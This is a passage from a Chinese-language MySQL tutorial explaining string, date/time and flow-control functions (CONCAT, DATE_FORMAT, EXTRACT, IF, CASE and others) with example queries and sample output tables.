TRIM(TRAILING s1 FROM s) =&gt; &#x53BB;&#x6389;&#x5B57;&#x7B26;&#x4E32;s&#x7ED3;&#x5C3E;&#x5904;&#x7684;s1
REPEAT(str, n) =&gt; &#x8FD4;&#x56DE;str&#x91CD;&#x590D;n&#x6B21;&#x7684;&#x7ED3;&#x679C;
SPACE(n) =&gt; &#x8FD4;&#x56DE;n&#x4E2A;&#x7A7A;&#x683C;
STRCMP(s1,s2) =&gt; &#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;s1,s2&#x7684;ASCII&#x7801;&#x503C;&#x7684;&#x5927;&#x5C0F;
SUBSTR(s,index,len) =&gt; &#x8FD4;&#x56DE;&#x4ECE;&#x5B57;&#x7B26;&#x4E32;s&#x7684;index&#x4F4D;&#x7F6E;&#x5176;len&#x4E2A;&#x5B57;&#x7B26;,&#x4F5C;&#x7528;&#x4E0E;SUBSTRING(s,n,len)&#x3001;MID(s,n,len)&#x76F8;&#x540C;
LOCATE(substr,str) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;substr&#x5728;&#x5B57;&#x7B26;&#x4E32;str&#x4E2D;&#x9996;&#x6B21;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;,&#x4F5C;&#x7528;&#x4E8E;POSITION(substr IN str)&#x3001;INSTR(str,substr)&#x76F8;&#x540C;.&#x672A;&#x627E;&#x5230;&#x8FD4;&#x56DE;0
ELT(m,s1,s2,&#x2026;,sn) =&gt; &#x8FD4;&#x56DE;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x7684;&#x5B57;&#x7B26;&#x4E32;,&#x5982;&#x679C;m=1&#x5219;&#x8FD4;&#x56DE;s1,&#x5982;&#x679C;m=2&#x5219;&#x8FD4;&#x56DE;s2,&#x5982;&#x679C;m=n&#x5219;&#x8FD4;&#x56DE;sn
FIELD(s,s1,s2,&#x2026;,sn) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;s&#x5728;&#x5B57;&#x7B26;&#x4E32;&#x5217;&#x8868;&#x4E2D;&#x7B2C;&#x4E00;&#x6B21;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;
FIND_IN_SET(s1,s2) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;s1&#x5728;&#x5B57;&#x7B26;&#x4E32;s2&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;.&#x5176;&#x4E2D;&#x5B57;&#x7B26;&#x4E32;s2&#x662F;&#x4E00;&#x4E2A;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#x7684;&#x5B57;&#x7B26;&#x4E32;
REVERSE(s) =&gt; &#x8FD4;&#x56DE;s&#x53CD;&#x8F6C;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E32;
NULLIF(value1,value2) =&gt; &#x6BD4;&#x8F83;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;,&#x5982;&#x679C;value1&#x4E0E;value2&#x76F8;&#x7B49;&#x5219;&#x8FD4;&#x56DE;NULL,&#x5426;&#x5219;&#x8FD4;&#x56DE;value1
*/
SELECT ASCII(&apos;Abc&apos;),CHAR_LENGTH(&apos;hello&apos;),CHAR_LENGTH(&apos;&#x5F00;&#x53D1;&apos;),LENGTH(&apos;hello&apos;),LENGTH(&apos;&#x5F00;&#x53D1;&apos;) FROM DUAL;
+--------------+----------------------+-----------------------+-----------------+------------------+
| ASCII(&apos;Abc&apos;) | CHAR_LENGTH(&apos;hello&apos;) | CHAR_LENGTH(&apos;&#x5F00;&#x53D1;&apos;)   | LENGTH(&apos;hello&apos;) | LENGTH(&apos;&#x5F00;&#x53D1;&apos;)   |
+--------------+----------------------+-----------------------+-----------------+------------------+
|           65 |                    5 |                     2 |               5 |                6 |
+--------------+----------------------+-----------------------+-----------------+------------------+
SELECT CONCAT(emp.last_name,&apos; worked for &apos;,mgr.last_name) &quot;details&quot; FROM employees emp JOIN employees mgr WHERE emp.manager_id = mgr.employee_id;
SELECT CONCAT_WS(&apos;-&apos;,&apos;hello&apos;,&apos;mysql&apos;,&apos;zs&apos;) FROM DUAL;
+-------------------------------------+
| CONCAT_WS(&apos;-&apos;,&apos;hello&apos;,&apos;mysql&apos;,&apos;zs&apos;) |
+-------------------------------------+
| hello-mysql-zs                      |
+-------------------------------------+
SELECT INSERT(&apos;helloworld&apos;,2,4,&apos;zszs&apos;), REPLACE(&apos;hellomysql&apos;,&apos;mysql&apos;,&apos;world&apos;),UPPER(&apos;Hello&apos;),LOWER(&apos;HELLO&apos;),LEFT(&apos;hello&apos;,2),RIGHT(&apos;hello&apos;,2) FROM DUAL;
+---------------------------------+---------------------------------------+----------------+----------------+-----------------+------------------+
| INSERT(&apos;helloworld&apos;,2,4,&apos;zszs&apos;) | REPLACE(&apos;hellomysql&apos;,&apos;mysql&apos;,&apos;world&apos;) | UPPER(&apos;Hello&apos;) | LOWER(&apos;HELLO&apos;) | LEFT(&apos;hello&apos;,2) | RIGHT(&apos;hello&apos;,2) |
+---------------------------------+---------------------------------------+----------------+----------------+-----------------+------------------+
| hzszsworld                      | helloworld                            | HELLO          | hello          | he              | lo               |
+---------------------------------+---------------------------------------+----------------+----------------+-----------------+------------------+
SELECT employee_id,last_name,LPAD(salary,10,&apos;*&apos;) FROM employees;
SELECT ELT(2,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;),FIELD(&apos;a&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;a&apos;),FIND_IN_SET(&apos;a&apos;,&apos;a,b,c,d,a,b,a&apos;),NULLIF(&apos;zs&apos;,&apos;zy&apos;) FROM DUAL;
+--------------------+----------------------------+----------------------------------+-------------------+
| ELT(2,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) | FIELD(&apos;a&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;a&apos;) | FIND_IN_SET(&apos;a&apos;,&apos;a,b,c,d,a,b,a&apos;) | NULLIF(&apos;zs&apos;,&apos;zy&apos;) |
+--------------------+----------------------------+----------------------------------+-------------------+
| b                  |                          1 |                                1 | zs                |
+--------------------+----------------------------+----------------------------------+-------------------+
</code></pre>
<h3 id="%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4%E5%87%BD%E6%95%B0">&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;&#x51FD;&#x6570;</h3>
<ul>
<li>&#x83B7;&#x53D6;&#x65E5;&#x671F;&#x3001;&#x65F6;&#x95F4;</li>
</ul>
<pre><code class="language-javascript">/*
CURDATE(),CURRENT_DATE() =&gt; &#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x65E5;&#x671F;&#xFF0C;&#x53EA;&#x5305;&#x542B;&#x5E74;&#x3001;&#x6708;&#x3001;&#x65E5;
CURTIME(),CURRENT_TIME() =&gt; &#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#xFF0C;&#x53EA;&#x5305;&#x542B;&#x65F6;&#x3001;&#x5206;&#x3001;&#x79D2;
NOW() / SYSDATE() / CURRENT_TIMESTAMP() / LOCALTIME() / LOCALTIMESTAMP() =&gt; &#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;
UTC_DATE() =&gt; &#x8FD4;&#x56DE; UTC &#x4E16;&#x754C;&#x6807;&#x51C6;&#x65F6;&#x95F4; &#x65E5;&#x671F;;&#x8F83;&#x5317;&#x4EAC;&#x65F6;&#x95F4;&#x5C11;8&#x5C0F;&#x65F6;
UTC_TIME() =&gt; &#x8FD4;&#x56DE; UTC &#x4E16;&#x754C;&#x6807;&#x51C6;&#x65F6;&#x95F4; &#x65F6;&#x95F4;;&#x8F83;&#x5317;&#x4EAC;&#x65F6;&#x95F4;&#x5C11;8&#x5C0F;&#x65F6;
*/
SELECT CURDATE(),CURDATE() + 0,CURTIME(),NOW(),SYSDATE()+ 0,UTC_DATE (),UTC_DATE ()+ 0,UTC_TIME (),UTC_TIME ()+ 0 FROM DUAL;
</code></pre>
<ul>
<li>&#x65E5;&#x671F;&#x4E0E;&#x65F6;&#x95F4;&#x6233;&#x7684;&#x8F6C;&#x6362;</li>
</ul>
<pre><code class="language-javascript">/*
UNIX_TIMESTAMP() =&gt; &#x4EE5;UNIX&#x65F6;&#x95F4;&#x6233;&#x7684;&#x5F62;&#x5F0F;&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x65F6;&#x95F4;
UNIX_TIMESTAMP(date) =&gt; &#x5C06;&#x65F6;&#x95F4;date&#x4EE5;UNIX&#x65F6;&#x95F4;&#x6233;&#x7684;&#x5F62;&#x5F0F;&#x8FD4;&#x56DE;
FROM_UNIXTIME(timestamp) =&gt; &#x5C06;UNIX&#x65F6;&#x95F4;&#x6233;&#x7684;&#x65F6;&#x95F4;&#x8F6C;&#x6362;&#x4E3A;&#x666E;&#x901A;&#x683C;&#x5F0F;&#x7684;&#x65F6;&#x95F4;
*/
SELECT UNIX_TIMESTAMP(),UNIX_TIMESTAMP(&apos;2019-08-09 21:22:23&apos;),FROM_UNIXTIME(1565356943) FROM DUAL;
+------------------+---------------------------------------+---------------------------+
| UNIX_TIMESTAMP() | UNIX_TIMESTAMP(&apos;2019-08-09 21:22:23&apos;) | FROM_UNIXTIME(1565356943) |
+------------------+---------------------------------------+---------------------------+
|       1565356943 |                            1565356943 | 2019-08-09 21:22:23       |
+------------------+---------------------------------------+---------------------------+
</code></pre>
<ul>
<li>&#x83B7;&#x53D6;&#x6708;&#x4EFD;&#x3001;&#x661F;&#x671F;&#x3001;&#x661F;&#x671F;&#x6570;&#x3001;&#x5929;&#x6570;&#x7B49;&#x51FD;&#x6570;</li>
</ul>
<pre><code class="language-javascript">/*
YEAR(date) / MONTH(date) / DAY(date) =&gt; &#x8FD4;&#x56DE;&#x5177;&#x4F53;&#x7684;&#x65E5;&#x671F;&#x503C;
HOUR(time) / MINUTE(time) / SECOND(time) =&gt; &#x8FD4;&#x56DE;&#x5177;&#x4F53;&#x7684;&#x65F6;&#x95F4;&#x503C;
MONTHNAME(date) =&gt; &#x8FD4;&#x56DE;&#x6708;&#x4EFD; January...
DAYNAME(date) =&gt; &#x8FD4;&#x56DE;&#x661F;&#x671F;&#x51E0; MONDAY...SUNDAY
WEEKDAY(date) =&gt; &#x8FD4;&#x56DE;&#x5468;&#x51E0;;&#x6CE8;&#x610F;&#x5468;1&#x662F;0...&#x5468;&#x65E5;&#x662F;6
QUARTER(date) =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x5BF9;&#x5E94;&#x7684;&#x5B63;&#x5EA6;&#x8303;&#x56F4;1&#xFF5E;4
WEEK(date) WEEKOFYEAR(date) =&gt; &#x8FD4;&#x56DE;&#x4E00;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x5468;
DAYOFYEAR(date) =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x662F;&#x4E00;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x5929;
DAYOFMONTH(date) =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x4F4D;&#x4E8E;&#x6240;&#x5728;&#x6708;&#x4EFD;&#x7684;&#x7B2C;&#x51E0;&#x5929;
DAYOFWEEK(date) =&gt; &#x8FD4;&#x56DE;&#x5468;&#x51E0;;&#x6CE8;&#x610F;&#x5468;&#x65E5;&#x662F;1...&#x5468;&#x516D;&#x662F;7
*/
SELECT YEAR(now()),MONTH(CURDATE()),DAY(CURDATE()),HOUR(CURTIME()),MINUTE(NOW()),SECOND(SYSDATE()) FROM DUAL;
SELECT MONTHNAME(&apos;2019-08-09&apos;),DAYNAME(&apos;2019-08-09&apos;),WEEKDAY(&apos;2019-08-09&apos;),QUARTER(CURDATE()),WEEK(CURDATE()),DAYOFYEAR(NOW()),DAYOFMONTH(NOW()),DAYOFWEEK(NOW()) FROM DUAL;
</code></pre>
<ul>
<li>&#x65E5;&#x671F;&#x7684;&#x64CD;&#x4F5C;&#x51FD;&#x6570;</li>
</ul>
<pre><code class="language-javascript">/*
EXTRACT(type FROM date) =&gt; &#x8FD4;&#x56DE;&#x6307;&#x5B9A;&#x65E5;&#x671F;&#x4E2D;&#x7279;&#x5B9A;&#x7684;&#x90E8;&#x5206;,type&#x6307;&#x5B9A;&#x8FD4;&#x56DE;&#x7684;&#x503C;;FROM&#x662F;&#x56FA;&#x5B9A;&#x503C;,date&#x662F;&#x63D0;&#x4F9B;&#x7684;&#x65E5;&#x671F;
---
MICROSECOND =&gt; &#x8FD4;&#x56DE;&#x4EB3;&#x79D2;&#x6570;
SECOND =&gt; &#x8FD4;&#x56DE;&#x79D2;&#x6570;
MINUTE =&gt; &#x8FD4;&#x56DE;&#x5206;&#x949F;&#x6570;
HOUR =&gt; &#x8FD4;&#x56DE;&#x5C0F;&#x65F6;&#x6570;
DAY =&gt; &#x8FD4;&#x56DE;&#x5929;&#x6570;
WEEK =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x5728;&#x4E00;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x4E2A;&#x661F;&#x671F;
MONTH =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x5728;&#x4E00;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x4E2A;&#x6708;
OUARTER =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x5728;&#x4E00;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x4E2A;&#x5B63;&#x5EA6;
YEAR =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x7684;&#x5E74;&#x4EFD;
SECOND_MICROSECOND =&gt; &#x8FD4;&#x56DE;&#x79D2;&#x548C;&#x4EB3;&#x79D2;&#x503C;
MINUTE_MICROSECOND =&gt; &#x8FD4;&#x56DE;&#x5206;&#x949F;&#x548C;&#x4EB3;&#x79D2;&#x503C;
MINUTE_SECOND =&gt; &#x8FD4;&#x56DE;&#x5206;&#x949F;&#x548C;&#x79D2;&#x503C;
HOUR_MICROSECOND =&gt; &#x8FD4;&#x56DE;&#x5C0F;&#x65F6;&#x548C;&#x4EB3;&#x79D2;&#x503C;
HOUR_SECOND =&gt; &#x8FD4;&#x56DE;&#x5C0F;&#x65F6;&#x548C;&#x79D2;&#x503C;
HOUR_MINUTE =&gt; &#x8FD4;&#x56DE;&#x5C0F;&#x65F6;&#x548C;&#x5206;&#x949F;&#x503C;
DAY_MICROSECOND =&gt; &#x8FD4;&#x56DE;&#x5929;&#x548C;&#x4EB3;&#x79D2;&#x503C;
DAY_SECOND =&gt; &#x8FD4;&#x56DE;&#x5929;&#x548C;&#x79D2;&#x503C;
DAY_MINUTE =&gt; &#x8FD4;&#x56DE;&#x5929;&#x548C;&#x5206;&#x949F;&#x503C;
DAY_HOUR =&gt; &#x8FD4;&#x56DE;&#x5929;&#x548C;&#x5C0F;&#x65F6;
YEAR_MONTH =&gt; &#x8FD4;&#x56DE;&#x5E74;&#x548C;&#x6708;
*/
SELECT EXTRACT(SECOND FROM NOW()), EXTRACT(DAY FROM NOW()), EXTRACT(QUARTER FROM &apos;2019-08-09&apos;) FROM DUAL;
</code></pre>
<ul>
<li>&#x65F6;&#x95F4;&#x548C;&#x79D2;&#x949F;&#x8F6C;&#x6362;&#x7684;&#x51FD;&#x6570;</li>
</ul>
<pre><code class="language-javascript">/*
TIME_TO_SEC(time) =&gt; &#x5C06; time &#x8F6C;&#x5316;&#x4E3A;&#x79D2;&#x5E76;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x503C;&#x3002;&#x8F6C;&#x5316;&#x7684;&#x516C;&#x5F0F;&#x4E3A;&#xFF1A;&#x5C0F;&#x65F6;*3600+&#x5206;&#x949F;*60+&#x79D2;
SEC_TO_TIME(seconds) =&gt; &#x5C06; seconds &#x63CF;&#x8FF0;&#x8F6C;&#x5316;&#x4E3A;&#x5305;&#x542B;&#x5C0F;&#x65F6;&#x3001;&#x5206;&#x949F;&#x548C;&#x79D2;&#x7684;&#x65F6;&#x95F4;
*/
SELECT TIME_TO_SEC(CURTIME()),SEC_TO_TIME(83355) FROM DUAL;
</code></pre>
<ul>
<li>&#x8BA1;&#x7B97;&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;&#x7684;&#x51FD;&#x6570;</li>
</ul>
<pre><code class="language-javascript">/*
DATE_ADD(datetime, INTERVAL expr type)&#xFF0C;ADDDATE(date,INTERVAL expr type) =&gt; &#x8FD4;&#x56DE;&#x4E0E;&#x7ED9;&#x5B9A;&#x65E5;&#x671F;&#x65F6;&#x95F4;datetime&#x76F8;&#x5DEE;INTERVAL&#x65F6;&#x95F4;&#x6BB5;&#x7684;&#x65E5;&#x671F;&#x65F6;&#x95F4;
DATE_SUB(date,INTERVAL expr type)&#xFF0C;SUBDATE(date,INTERVAL expr type) =&gt; &#x8FD4;&#x56DE;&#x7ED9;&#x5B9A;date&#x65E5;&#x671F;&#x76F8;&#x5DEE;INTERVAL&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x7684;&#x65E5;&#x671F;
ADDTIME(time1,time2) =&gt; &#x8FD4;&#x56DE;time1&#x52A0;&#x4E0A;time2&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5F53;time2&#x4E3A;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x65F6;&#xFF0C;&#x4EE3;&#x8868;&#x7684;&#x662F;&#x79D2;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x8D1F;&#x6570;
SUBTIME(time1,time2) =&gt; &#x8FD4;&#x56DE;time1&#x51CF;&#x53BB;time2&#x540E;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5F53;time2&#x4E3A;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#x65F6;&#xFF0C;&#x4EE3;&#x8868;&#x7684;&#x662F;&#x79D2;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x8D1F;&#x6570;
DATEDIFF(date1,date2) =&gt; &#x8FD4;&#x56DE;date1 - date2&#x7684;&#x65E5;&#x671F;&#x95F4;&#x9694;&#x5929;&#x6570;
TIMEDIFF(time1, time2) =&gt; &#x8FD4;&#x56DE;time1 - time2&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;
FROM_DAYS(N) =&gt; &#x8FD4;&#x56DE;&#x4ECE;0000&#x5E74;1&#x6708;1&#x65E5;&#x8D77;&#xFF0C;N&#x5929;&#x4EE5;&#x540E;&#x7684;&#x65E5;&#x671F;
TO_DAYS(date) =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;date&#x8DDD;&#x79BB;0000&#x5E74;1&#x6708;1&#x65E5;&#x7684;&#x5929;&#x6570;
LAST_DAY(date) =&gt; &#x8FD4;&#x56DE;date&#x6240;&#x5728;&#x6708;&#x4EFD;&#x7684;&#x6700;&#x540E;&#x4E00;&#x5929;&#x7684;&#x65E5;&#x671F;
MAKEDATE(year,n) =&gt; &#x9488;&#x5BF9;&#x7ED9;&#x5B9A;&#x5E74;&#x4EFD;&#x4E0E;&#x6240;&#x5728;&#x5E74;&#x4EFD;&#x4E2D;&#x7684;&#x5929;&#x6570;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x65E5;&#x671F;
MAKETIME(hour,minute,second) =&gt; &#x5C06;&#x7ED9;&#x5B9A;&#x7684;&#x5C0F;&#x65F6;&#x3001;&#x5206;&#x949F;&#x548C;&#x79D2;&#x7EC4;&#x5408;&#x6210;&#x65F6;&#x95F4;&#x5E76;&#x8FD4;&#x56DE;
PERIOD_ADD(time,n) =&gt; &#x8FD4;&#x56DE;time&#x52A0;&#x4E0A;n&#x540E;&#x7684;&#x65F6;&#x95F4;
*/
SELECT DATE_ADD(NOW(), INTERVAL 1 DAY) AS col1,DATE_ADD(&apos;2019-08-09 21:22:23&apos;,INTERVAL 1 SECOND) AS col2,ADDDATE(&apos;2019-08-09 21:22:23&apos;,INTERVAL 1 MINUTE) AS col3,DATE_ADD(&apos;2019-08-09 21:22:23&apos;,INTERVAL &apos;1_1&apos; MINUTE_SECOND) AS col4,DATE_ADD(NOW(), INTERVAL -1 YEAR) AS col5,DATE_ADD(NOW(), INTERVAL &apos;1_1&apos; YEAR_MONTH) AS col6 FROM DUAL;
SELECT ADDTIME(NOW(),20),SUBTIME(NOW(),30),SUBTIME(NOW(),&apos;1:1:3&apos;),DATEDIFF(NOW(),&apos;2020-08-09&apos;),TIMEDIFF(NOW(),&apos;2019-04-22 22:23:24&apos;),FROM_DAYS(366),TO_DAYS(&apos;0000-04-22&apos;),LAST_DAY(NOW()),MAKEDATE(YEAR(NOW()),12),MAKETIME(21,22,23),PERIOD_ADD(20190809010101,10) FROM DUAL;
</code></pre>
<ul>
<li>&#x65E5;&#x671F;&#x7684;&#x683C;&#x5F0F;&#x5316;&#x4E0E;&#x89E3;&#x6790;</li>
</ul>
<pre><code class="language-javascript">/*
&#x683C;&#x5F0F;&#x5316; &#x65E5;&#x671F; =&gt; &#x5B57;&#x7B26;&#x4E32;
&#x89E3;&#x6790;   &#x5B57;&#x7B26;&#x4E32; =&gt; &#x65E5;&#x671F;
DATE_FORMAT(date,fmt) =&gt; &#x6309;&#x7167;&#x5B57;&#x7B26;&#x4E32;fmt&#x683C;&#x5F0F;&#x5316;&#x65E5;&#x671F;date&#x503C;
TIME_FORMAT(time,fmt) =&gt; &#x6309;&#x7167;&#x5B57;&#x7B26;&#x4E32;fmt&#x683C;&#x5F0F;&#x5316;&#x65F6;&#x95F4;time&#x503C;
GET_FORMAT(date_type,format_type) =&gt; &#x8FD4;&#x56DE;&#x65E5;&#x671F;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x663E;&#x793A;&#x683C;&#x5F0F;
STR_TO_DATE(str, fmt) =&gt; &#x6309;&#x7167;&#x5B57;&#x7B26;&#x4E32;fmt&#x5BF9;str&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x89E3;&#x6790;&#x4E3A;&#x4E00;&#x4E2A;&#x65E5;&#x671F;
---
fmt &#x53C2;&#x6570;&#x5E38;&#x7528;&#x7684;&#x683C;&#x5F0F;&#x7B26;
%Y =&gt; 4&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5E74;&#x4EFD;
%y =&gt; &#x8868;&#x793A;&#x4E24;&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5E74;&#x4EFD;
%M =&gt; &#x6708;&#x540D;&#x8868;&#x793A;&#x6708;&#x4EFD; January,...
%m =&gt; &#x4E24;&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x6708;&#x4EFD;(01,02,03...)
%b =&gt; &#x7F29;&#x5199;&#x7684;&#x6708;&#x540D; Jan.&#xFF0C;Feb.,...
%c =&gt; &#x6570;&#x5B57;&#x8868;&#x793A;&#x6708;&#x4EFD;(1,2,3,...)
%D =&gt; &#x82F1;&#x6587;&#x540E;&#x7F00;&#x8868;&#x793A;&#x6708;&#x4E2D;&#x7684;&#x5929;&#x6570; 1st,2nd,3rd...
%d =&gt; &#x4E24;&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x6708;&#x4E2D;&#x7684;&#x5929;&#x6570;(01,02...)
%e =&gt; &#x6570;&#x5B57;&#x5F62;&#x5F0F;&#x8868;&#x793A;&#x6708;&#x4E2D;&#x7684;&#x5929;&#x6570; 1,2,3,4,5...
%H =&gt; &#x4E24;&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5C0F;&#x65F6;;24&#x5C0F;&#x65F6;&#x5236;(01,02,03)
%h&#x548C;%I =&gt; &#x4E24;&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5C0F;&#x65F6;;12&#x5C0F;&#x65F6;&#x5236;(01,02...)
%k =&gt; &#x6570;&#x5B57;&#x5F62;&#x5F0F;&#x7684;&#x5C0F;&#x65F6;;24&#x5C0F;&#x65F6;&#x5236;(1,2,3)
%l =&gt; &#x6570;&#x5B57;&#x5F62;&#x5F0F;&#x8868;&#x793A;&#x5C0F;&#x65F6;;12&#x5C0F;&#x65F6;&#x5236;(1,2,3,4...)
%i =&gt; &#x4E24;&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5206;&#x949F;(00,01,02)
%S&#x548C;%s =&gt; &#x4E24;&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x79D2;(00,01,02...)
%W =&gt; &#x4E00;&#x5468;&#x4E2D;&#x7684;&#x661F;&#x671F;&#x540D;&#x79F0; Sunday...
%a =&gt; &#x4E00;&#x5468;&#x4E2D;&#x7684;&#x661F;&#x671F;&#x7F29;&#x5199;(Sun.&#xFF0C;Mon...)
%w =&gt; &#x4EE5;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5468;&#x4E2D;&#x7684;&#x5929;&#x6570;(0=Sunday,1=Monday...)
%j =&gt; &#x4EE5;3&#x4F4D;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5E74;&#x4E2D;&#x7684;&#x5929;&#x6570;(001,002...)
%U =&gt; &#x4EE5;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x5468;(1,2,3...);Sunday &#x4E3A;&#x5468;&#x4E2D;&#x7B2C;&#x4E00;&#x5929;
%u =&gt; &#x4EE5;&#x6570;&#x5B57;&#x8868;&#x793A;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x5468;(1,2,3...);Monday &#x4E3A;&#x5468;&#x4E2D;&#x7B2C;&#x4E00;&#x5929;
%T =&gt; 24&#x5C0F;&#x65F6;&#x5236;
%r =&gt; 12&#x5C0F;&#x65F6;&#x5236;
%p =&gt; AM &#x6216; PM
%% =&gt; &#x8868;&#x793A;%
---
GET_FORMAT&#x51FD;&#x6570;&#x4E2D;date_type&#x548C;format_type&#x53C2;&#x6570;&#x53D6;&#x503C;
DATE =&gt; USA =&gt; %m.%d.%Y
TIME =&gt; USA =&gt; %h:%i:%s%p
DATETIME =&gt; USA =&gt; %Y-%m-%d %H.%i.%s
*/
SELECT DATE_FORMAT(CURDATE(),&apos;%Y-%m-%d&apos;),TIME_FORMAT(CURTIME(),&apos;%H:%i:%s&apos;),DATE_FORMAT(NOW(),&apos;%Y-%m-%d %H:%i:%s %W %w %T %r&apos;) FROM DUAL;
SELECT STR_TO_DATE(&apos;2019-08-09 21:22:23&apos;,&apos;%Y-%m-%d %H:%i:%s&apos;) FROM DUAL;
SELECT GET_FORMAT(DATE,&apos;USA&apos;) FROM DUAL;
SELECT DATE_FORMAT(CURDATE(),GET_FORMAT(DATE,&apos;USA&apos;)) FROM DUAL;
</code></pre>
<h3 id="%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%87%BD%E6%95%B0">&#x6D41;&#x7A0B;&#x63A7;&#x5236;&#x51FD;&#x6570;</h3>
<p>&#x6D41;&#x7A0B;&#x5904;&#x7406;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x6267;&#x884C;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;&#x6D41;&#x7A0B;&#xFF0C;&#x5373;&#x5FAA;&#x73AF;&#x5224;&#x65AD;&#x5206;&#x652F;&#x3002;</p>
<pre><code class="language-javascript">/*
IF(value,value1,value2) =&gt; value&#x7684;&#x503C;&#x4E3A;TRUE&#x8FD4;&#x56DE;value1,&#x5426;&#x5219;&#x8FD4;&#x56DE;value2 =&gt; &#x548C;&#x4E09;&#x5143;&#x8FD0;&#x7B97;&#x7C7B;&#x4F3C;
IFNULL(value1, value2) =&gt; value1&#x4E0D;&#x4E3A;NULL&#x8FD4;&#x56DE;value1,&#x5426;&#x5219;&#x8FD4;&#x56DE;value2
CASE WHEN &#x6761;&#x4EF6;1 THEN &#x7ED3;&#x679C;1 WHEN &#x6761;&#x4EF6;2 THEN &#x7ED3;&#x679C;2 &#x2026; [ELSE resultn] END =&gt; &#x76F8;&#x5F53;&#x4E8E;Java&#x7684;if&#x2026;else if&#x2026;else&#x2026;
CASE expr WHEN &#x5E38;&#x91CF;&#x503C;1 THEN &#x503C;1 WHEN &#x5E38;&#x91CF;&#x503C;1 THEN &#x503C;1 &#x2026; [ELSE &#x503C;n] END =&gt; &#x76F8;&#x5F53;&#x4E8E;Java&#x7684;switch&#x2026;case&#x2026;
*/
SELECT last_name,salary,IF(salary &gt;= 8000,&apos;&#x8FD8;ok&apos;,&apos;&#x52A0;&#x6CB9;&#x5427;&apos;) FROM employees;
SELECT last_name,commission_pct,IF(commission_pct IS NOT NULL,commission_pct,0) &apos;details&apos; FROM employees;
// IFNULL &#x770B;&#x4F5C; IF &#x7684;&#x7279;&#x6B8A;&#x60C5;&#x51B5; =&gt; &#x4EC5;&#x770B;&#x662F;&#x5426;&#x4E3A; NULL
SELECT last_name,commission_pct,IFNULL(commission_pct,0) &apos;details&apos; FROM employees;
SELECT last_name,salary,CASE WHEN salary &gt;= 15000 THEN &apos;A&apos; WHEN salary &gt;= 10000 THEN &apos;B&apos; ELSE &apos;C&apos; END &apos;details&apos; FROM employees;
</code></pre>
